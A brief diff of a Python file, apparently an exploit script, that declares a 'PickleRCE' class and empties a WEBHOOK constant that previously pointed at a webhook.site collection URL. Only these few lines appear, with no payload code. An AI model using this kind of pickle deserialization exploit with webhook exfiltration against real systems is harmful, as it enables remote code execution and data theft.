@@ -3,7 +3,7 @@ import base64
 import socket
 import requests as r
 
-WEBHOOK = "https://webhook.site/19612ec6-24c7-41cb-9b10-92ba341798e4"
+WEBHOOK = ""
 
 
 class PickleRCE(object):
